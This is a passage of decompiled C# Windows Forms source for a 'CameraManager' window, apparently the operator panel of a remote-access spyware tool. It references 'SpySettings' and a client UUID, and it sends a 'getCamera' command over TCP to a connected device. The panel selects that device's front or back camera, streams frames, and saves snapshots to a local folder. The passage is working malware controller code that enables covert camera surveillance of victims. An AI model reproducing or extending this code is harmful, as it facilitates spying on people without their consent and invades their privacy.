		this.pinbtn.TagString = "s";
		this.DrakeUIToolTip1.SetToolTip(this.pinbtn, "PIN");
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.DrakeUIAvatar2);
		this.Panel3.Controls.Add(this.pinbtn);
		this.Panel3.Controls.Add(this.hidetoolbtn);
		this.Panel3.Controls.Add(this.Button3);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel3.Location = new System.Drawing.Point(731, 17);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(55, 486);
		this.Panel3.TabIndex = 30;
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 17f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(786, 558);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel4);
		this.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.MaximizeBox = false;
		this.MinimumSize = new System.Drawing.Size(352, 333);
		base.Name = "CameraManager";
		base.Opacity = 0.0;
		this.Text = "CameraManager";
		((System.ComponentModel.ISupportInitialize)this.CAM0).EndInit();
		this.Panel1.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	public void addsizes(object[] objs)
	{
		if (base.InvokeRequired)
		{
			addsizedele method = addsizes;
			Invoke(method, new object[1] { objs });
			return;
		}
		string[] array = (string[])objs[0];
		if (array != null && array.Length > 0)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				combosizes.Items.Add(text.Replace("[", "").Replace("]", ""));
			}
			combosizes.Text = array[0];
			combosizes.MaxDropDownItems = array.Length;
		}
	}

	private void tranlsateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				startbtn.Text = Codes.Translate(startbtn.Text, "en", "zh");
				Sbtn.Text = Codes.Translate(Sbtn.Text, "en", "zh");
				combotext.Text = Codes.Translate(combotext.Text, "en", "zh");
				qultytext.Text = Codes.Translate(qultytext.Text, "en", "zh");
			}
		}
		else
		{
			startbtn.Text = Codes.Translate(startbtn.Text, "en", "ar");
			Sbtn.Text = Codes.Translate(Sbtn.Text, "en", "ar");
			combotext.Text = Codes.Translate(combotext.Text, "en", "ar");
			qultytext.Text = Codes.Translate(qultytext.Text, "en", "ar");
		}
	}

	private void CameraManager_Load(object sender, EventArgs e)
	{
		base.Tag = "Cam_" + classClient.UUID;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\6.ico");
		cmbofoucs.Text = "No";
		Frames.Start();
		ClientPic.Image = classClient.Wallpaper;
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		tranlsateme();
		Focus();
		TOpacity.Enabled = true;
		SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
		keepmeto = true;
	}

	private void Frames_Tick(object sender, EventArgs e)
	{
		FPS = FPSTMP;
		FPSTMP = 0;
		SizeFrame = "0 kb";
	}

	private void CAM0_MouseHover(object sender, EventArgs e)
	{
	}

	private void CAM0_MouseLeave(object sender, EventArgs e)
	{
	}

	public void UpdateFPS()
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			newphoto = true;
			fpstext.Text = " FPS : <" + Conversions.ToString(FPS) + "> - SPEED : <" + SizeFrame + ">";
		}));
	}

	public Image RotateFlip(Image imag)
	{
		try
		{
			TempImage.Image = imag;
			if (TempImage != null)
			{
				switch (KEYsx)
				{
				case "Down":
					TempImage.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
					TempImage.Tag = "180y";
					break;
				case "Up":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
					TempImage.Tag = "180x";
					break;
				case "Left":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
					TempImage.Tag = "270n";
					break;
				case "Right":
					TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
					TempImage.Tag = "90n";
					break;
				}
				return TempImage.Image;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	private void Button4_Click(object sender, EventArgs e)
	{
	}

	private void Button3_Click(object sender, EventArgs e)
	{
	}

	private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		boSave = false;
		DrakeUILampLED1.Enabled = false;
		DrakeUILampLED1.Visible = false;
		DrakeUILampLED1.Blink = false;
		Frames.Stop();
		Frames.Dispose();
		DrakeUILampLED1.Dispose();
		Frames.Enabled = false;
		if (Changed && classCamera != null)
		{
			classCamera.qit = true;
			classCamera.Close(classCamera.myClient);
		}
	}

	public void Selected(string V)
	{
		try
		{
			if (classClient == null || Operators.CompareString(CamerID, "null", TextCompare: false) == 0)
			{
				return;
			}
			Client client = classClient;
			TcpClient client2 = Client;
			string[] array = client.Keys.Split(':');
			int num = ((Operators.CompareString(cmbofoucs.Text, "Yes", TextCompare: false) == 0) ? 1 : 0);
			int num2 = 1;
			string text = "";
			string text2 = "";
			try
			{
				if (combosizes.Visible)
				{
					string[] array2 = combosizes.Text.Split('x');
					text = array2[0];
					text2 = array2[1];
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				text = Conversions.ToString(460);
				text2 = Conversions.ToString(840);
				ProjectData.ClearProjectError();
			}
			string text3 = comboqualty.Text;
			if (client.Isv4)
			{
				object[] parametersObjects = new object[4]
				{
					client2,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + V + "," + text + "," + text2 + "," + text3 + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.getCamera + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
			else
			{
				object[] parametersObjects2 = new object[4]
				{
					client2,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + V + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.getCamera + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects2);
			}
			CAM0.Image = Resources.onloading;
			statustext.Text = "Please Wait....";
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButton2_Click(object sender, EventArgs e)
	{
		if (Changed)
		{
			Changed = false;
			if (classCamera != null)
			{
				statustext.Text = "Select Camera...";
				classCamera.qit = true;
				classCamera.Close(classCamera.myClient);
			}
		}
		startbtn.Enabled = true;
		CAM0.Image = null;
		Sbtn.Enabled = false;
		Button3.Enabled = false;
	}

	private void DrakeUIButton1_Click_2(object sender, EventArgs e)
	{
	}

	private void DrakeUIButton2_Click_1(object sender, EventArgs e)
	{
	}

	private void Addpo_Click(object sender, EventArgs e)
	{
		if (CAM0.Image == null)
		{
			return;
		}
		if (Operators.CompareString(Button3.Tag.ToString(), "off", TextCompare: false) == 0)
		{
			DrakeUILampLED1.Enabled = true;
			DrakeUILampLED1.Visible = true;
			DrakeUILampLED1.Blink = true;
			Button3.Tag = "on";
			savetimer.Start();
			Button3.Text = "ON";
			Button3.ForeColor = Color.Lime;
			boSave = true;
		}
		else if (Operators.CompareString(Button3.Tag.ToString(), "on", TextCompare: false) == 0)
		{
			DrakeUILampLED1.Enabled = false;
			DrakeUILampLED1.Visible = false;
			DrakeUILampLED1.Blink = false;
			Button3.Tag = "off";
			Button3.ForeColor = Color.FromArgb(157, 5, 17);
			savetimer.Stop();
			Button3.Text = "Save";
			string text = tmpFolderUSER + "\\Camera Manager";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
			Button3.ForeColor = Color.White;
			Button3.BackColor = Color.Transparent;
			boSave = false;
		}
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (CAM0.Image != null)
		{
			if (Operators.CompareString(KEYsx, "Right", TextCompare: false) == 0)
			{
				KEYsx = "Down";
			}
			else if (Operators.CompareString(KEYsx, "Down", TextCompare: false) == 0)
			{
				KEYsx = "Left";
			}
			else if (Operators.CompareString(KEYsx, "Left", TextCompare: false) == 0)
			{
				KEYsx = "Up";
			}
			else if (Operators.CompareString(KEYsx, "Up", TextCompare: false) == 0)
			{
				KEYsx = "Right";
			}
			else
			{
				KEYsx = "Right";
			}
		}
	}

	private void Savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = tmpFolderUSER + "\\Camera Manager";
			if (boSave)
			{
				if (newphoto)
				{
					newphoto = false;
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(text))
					{
						CAM0.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
					}
				}
			}
			else
			{
				savetimer.Stop();
				savetimer.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButton1_Click_3(object sender, EventArgs e)
	{
		string left = combocam.Text;
		if (Operators.CompareString(left, "Front", TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, "Back", TextCompare: false) == 0)
			{
				statustext.Text = "Selected : Back Camera, Please Wait...";
				Sbtn.Enabled = true;
				startbtn.Enabled = false;
				CamerID = "0";
				Selected("0");
				SelectedCamera = "Back Camera";
			}
		}
		else
		{
			statustext.Text = "Selected : Front Camera, Please Wait...";
			Sbtn.Enabled = true;
			startbtn.Enabled = false;
			CamerID = "1";
			Selected("1");
			SelectedCamera = "Front Camera";
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(hidetoolbtn.TagString, "s", TextCompare: false) == 0)
		{
			hidetoolbtn.TagString = "h";
			Panel2.Enabled = false;
			Panel2.Visible = false;
		}
		else
		{
			hidetoolbtn.TagString = "s";
			Panel2.Enabled = true;
			Panel2.Visible = true;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.Lime;
			SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.Red;
			SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}
}
